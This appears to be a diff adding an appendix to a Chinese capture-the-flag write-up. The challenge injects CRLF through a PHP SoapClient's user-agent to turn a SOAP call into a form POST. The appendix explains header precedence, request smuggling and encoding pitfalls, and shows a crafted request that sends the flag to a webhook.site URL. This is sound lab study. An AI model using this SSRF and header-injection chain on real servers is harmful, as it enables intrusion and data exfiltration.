@@ -471,3 +471,252 @@ file_put_contents(__DIR__ . '/p.txt', ...);   // __DIR__ = 脚本所在目录
 > **核心一句**：`User-Agent` 排在 `Content-Type` 前面，而 HTTP 头**首值优先** —— 所以从 `_user_agent` 注入才能"抢到" Content-Type。
 >
 > **反直觉一句**：这题**响应为空才是成功**，有报错说明还没打通。
+
+---
+
+# 附录：五个协议层问答
+
+> 这五条**比 payload 本身更通用**。以后遇到 Header 注入、请求走私、CRLF 相关的题，都是同一套逻辑。
+
+**它们其实指向同一件事**：
+
+> HTTP 是一条**线性文本协议**，不是对象图。
+> 头在空行处截止（A4）→ 所以原本的头会失效（A1）；重复头取第一个（A2）→ 所以想覆盖必须排前面；`Content-Type` 决定服务端怎么解释 body（A3）→ 所以它值得抢；跨进程传这条带换行的文本时，编码只能做一次（A5）。
+
+---
+
+## A1. 注入前 vs 注入后，请求到底差在哪
+
+### 修改前（SoapClient 原生请求）
+
+```http
+POST /un92.php HTTP/1.1
+Host: 127.0.0.1
+Connection: Keep-Alive
+User-Agent: PHP-SOAP/5.5.38
+Content-Type: text/xml; charset=utf-8        ← 关键
+SOAPAction: "x#pyflag"
+Content-Length: 370
+                                             ← 空行
+<?xml version="1.0" encoding="UTF-8"?>       ← 全是 XML
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="...">
+  <SOAP-ENV:Body>
+    <ns1:pyflag/>
+  </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>
+```
+
+**un92 的视角**：
+
+```
+Content-Type = text/xml  →  PHP 不解析 body  →  $_POST = []（空数组）
+$_POST['py'] 不存在       →  if 条件为假      →  什么都不做
+```
+
+→ 请求发到了、un92 也执行了，但 **flag 一个字节都不会发出去**。
+
+### 修改后（从 `_user_agent` 注入）
+
+```http
+POST /un92.php HTTP/1.1
+Host: 127.0.0.1
+Connection: Keep-Alive
+User-Agent: a                                     ← 注入从这里开始
+Content-Type: application/x-www-form-urlencoded   ← 我们的（第 1 个）
+Content-Length: 108                               ← 我们的（第 1 个）
+                                                  ← 空行（我们插的，头在这里结束）
+py=flag&url=https://webhook.site/xxxx             ← body
+Content-Type: text/xml; charset=utf-8             ┐
+SOAPAction: "x#pyflag"                            │ 原本的头，现在只是 body 里的字节
+Content-Length: 370                               │
+                                                  │
+<?xml version="1.0"?>...                          ┘
+```
+
+**un92 的视角**：
+
+```
+Content-Type = application/x-www-form-urlencoded  →  PHP 解析前 108 字节  →  $_POST = {py:flag, url:...}
+$_POST['py'] == 'flag'                            →  条件成立  →  把 flag 发到 $_POST['url']
+```
+
+### 差异汇总
+
+| | 修改前 | 修改后 |
+|---|---|---|
+| 头的组数 | 1 组 | 1 组（**但内容被换掉了**） |
+| `Content-Type` | `text/xml` | `application/x-www-form-urlencoded` |
+| `Content-Length` | 370（XML 长度） | 108（表单长度） |
+| body | SOAP XML | `py=flag&url=...` |
+| 原本的 XML | 就是 body | 变成"body 之后的多余字节" |
+| `$_POST` | `[]` | `{py:flag, url:...}` |
+| 结果 | 无反应 | 🚩 |
+
+> **一句话**：改的不是"表单内容"，而是**整条请求的身份**——从"一次 SOAP 调用"变成"一次表单提交"，只是这个变身靠**头注入**完成。
+
+---
+
+## A2. 为什么"排在前面的赢"，不是后面覆盖前面？
+
+**因为 HTTP 头不是"变量赋值"，是"信封上的多行标签"。**
+
+编程直觉（后写覆盖先写）：
+
+```python
+x = 1
+x = 2      # x 是 2
+```
+
+但规范和实现都不是这个语义（RFC 7230 §3.2.2）：
+
+| 情况 | 接收方该怎么办 |
+|---|---|
+| 该头**允许逗号列表**（`Accept`、`Cache-Control`） | **合并**所有出现 |
+| 该头**不允许列表**（`Content-Type`、`Content-Length`） | 视为非法，**或者**（历史实际做法）**只取第一个，其余丢弃** |
+
+`Content-Type` 属于第二类 → **实现上只认第一个**。
+
+**为什么这么实现**：解析器边扫边往映射表里填，填的时候发现"这个键已经有了"就跳过 → **先到先得**。
+
+**比方**：
+
+```
+编程赋值 = 白板上写数字，擦掉重写      → 最后写的算
+HTTP 头  = 信封上贴 5 张标签，从上往下读 → 看到"收件人"就定了，下面同类的直接忽略
+```
+
+**⚠️ 这不是铁律，是经验规律**：
+
+| 实现 | 行为 |
+|---|---|
+| Apache + PHP（本题） | 取第一个（实测通过） |
+| 部分服务器 / 网关 | 直接 **400 拒绝**重复头 |
+| Nginx | 某些头会做合并 |
+
+**→ 所以必须用 webhook 分级验证，不能假设。**
+
+> **重量级推论**：正因为"重复 `Content-Length` 取第一个"这类行为存在，才有了 **HTTP 请求走私（Request Smuggling）**。如果所有服务器都严格拒绝重复，这整个漏洞大类就不存在了。你在本题看到的"首值优先"，就是那类漏洞的地基。
+
+---
+
+## A3. `Content-Type` 该写什么？为什么要抢它？
+
+### 写什么：协议规定，不是自创
+
+PHP **只会**在两种 Content-Type 下填充 `$_POST`：
+
+| Content-Type | PHP 行为 | 对应场景 |
+|---|---|---|
+| **`application/x-www-form-urlencoded`** | 解析 `k=v&k=v` → 填 `$_POST` | **普通表单**（浏览器 `<form method="post">` 默认） |
+| `multipart/form-data` | 解析 → `$_POST` + `$_FILES` | 带文件上传的表单 |
+| 其他（`text/xml`、`application/json` …） | **不解析** | `$_POST` 永远是空数组 |
+
+我们的 body 是 `py=flag&url=xxx`，正是 `k=v&k=v` → 对应第一种。
+
+**记忆方法**：把 `x-www-form-urlencoded` 理解成"**URL 查询串那套编码规则搬到 body 里用**"——`&` 分隔、`=` 连接、特殊字符 `%XX`。名字里的 `urlencoded` 就是这个意思。
+
+（想确认：随便打开一个表单页面 → F12 → Network → 看请求头，就是这一行。）
+
+### 为什么必须抢
+
+un92 的代码依赖 `$_POST`：
+
+```php
+if ($_POST['py'] == 'flag') { 把 flag 发到 $_POST['url'] }
+```
+
+而 `$_POST` 是 **PHP 根据 Content-Type 决定填不填**的：
+
+```
+Content-Type 不对  →  $_POST 是空的  →  条件永远不成立  →  flag 永远不发
+```
+
+**反直觉的点**：
+
+> body 写得**完全正确**（一个字符不差），只要 Content-Type 还是 `text/xml`，**un92 的 PHP 根本不会去看它**。
+> 像寄了一封格式完美的信，但信封写着"这是 XML 文件"，前台直接扔进"不处理"的筐。
+
+**→ 这题真正的门槛不是"能不能塞 body"，而是"能不能让 PHP 把 body 当表单读"。**
+前半句谁都做得到（`uri` 注入就能塞 body），后半句才是分水岭——这就是当初 `uri` 注入"body 进去了但 un92 收不到参数"的根本原因。
+
+---
+
+## A4. 原本在头部的那些行，到了 body 区还有用吗？
+
+**完全没用了。**
+
+HTTP 的头部区域**在第一个空行处就结束**，这是硬性定义：
+
+```
+头部区域：从第一行到第一个空行（不含）
+body 区域：空行之后的一切
+```
+
+**HTTP 里不存在"后面的头"这个概念。** 空行之后的所有字节，无论长得多像头，都只是 body 数据。
+
+所以原本那些：
+
+```
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "x#pyflag"
+Content-Length: 370
+<?xml ...>
+```
+
+**字节还在线上（没消失），但不再是头了** —— 服务端永远不会把它们当头解析。去向：
+
+| 部分 | 去向 |
+|---|---|
+| 我们 `Content-Length: 108` 覆盖的范围 | 算 body（我们的表单） |
+| 108 字节之后的所有残余 | 被当成**同一连接上的下一个请求**的开头 |
+
+最后一条就是**请求走私**的机制。Apache 会试着把 `Content-Type: text/xml; charset=utf-8` 当**请求行**解析 → 不是合法的 `METHOD PATH HTTP/1.1` → **400 Bad Request** → 关闭连接。
+
+**那为什么不影响成功？** 两个原因：
+
+1. **`Content-Length: 108` 卡住了读取边界** —— un92 只读 108 字节就收工，后面的垃圾进不了 `$_POST`
+2. **第一个请求已经处理完了** —— flag 早就发出去了，Apache 对"第二个请求"报 400 是它自己的事
+
+> **规律**：CRLF 注入的本质是"**提前结束头部**"。一旦结束，**后面所有原本的头都降级成 body 数据**。
+> 这就是它为什么能"覆盖"——**不是改写了那些头，而是让它们不再是头。**
+
+---
+
+## A5. 为什么 `params={"tryhackme": p}` 会二次编码
+
+### 逐层看字节
+
+```python
+p = "O%3A10%3A%22SoapClient%22..."        # PHP 已经 urlencode 过一次
+requests.get(url, params={"tryhackme": p})
+```
+
+`requests` 拿到 `params` 会**再编码一遍**（这是它的契约：你给原始值，它负责编码）。而编码规则里 **`%` 本身也要被编码成 `%25`**：
+
+| 阶段 | `tryhackme` 的值 |
+|---|---|
+| PHP 端 `urlencode`（第 1 次） | `O%3A10%3A%22SoapClient%22` |
+| `requests` 再编码（第 2 次） | `O%253A10%253A%2522SoapClient%2522` |
+| 靶机收到 query，**解码 1 次** | `O%3A10%3A%22SoapClient%22` |
+| `unserialize()` 看到 | **`O%3A10%3A...`** → 第 2 个字符是 `%` 不是 `:` → **格式错 → 返回 `false`** |
+| 然后 `$a->pyflag()` | `Call to a member function pyflag() on a non-object` |
+
+**关键**：靶机**只解码一次**（URL 解码是"解一层"）。你编码了两次，就只还原得了一层。
+
+### 四种组合，只有两种能跑
+
+| 组合 | PHP 端 | Python 端 | 结果 |
+|---|---|---|---|
+| **A** | `urlencode()` | **直接拼 URL** | ✅ 推荐 |
+| **B** | 原始 `serialize()` | **`params=`** | ✅ 可用 |
+| C | `urlencode()` | `params=` | ❌ **二次编码** |
+| D | 原始 `serialize()` | 直接拼 URL | ❌ 裸 CRLF **截断请求行** |
+
+> **核心原则：编码只能做一次，谁做谁负责。**
+> - 选 A：**PHP 负责编码 → Python 原样发**
+> - 选 B：**Python 负责编码 → PHP 只给原始串**
+
+**C 和 D 是同一个错误的两种形态**：C 是"编码了两次"，D 是"该编码的没人编码"。
+
+**为什么推荐 A**：原始串里有**真换行**，没法通过命令行参数、也没法复制粘贴传递（`input()` 会在第一个换行截断）。**编码成一行纯 ASCII 之后才能安全落盘做中转** —— 这就是 `p.txt` 存在的全部理由。
+
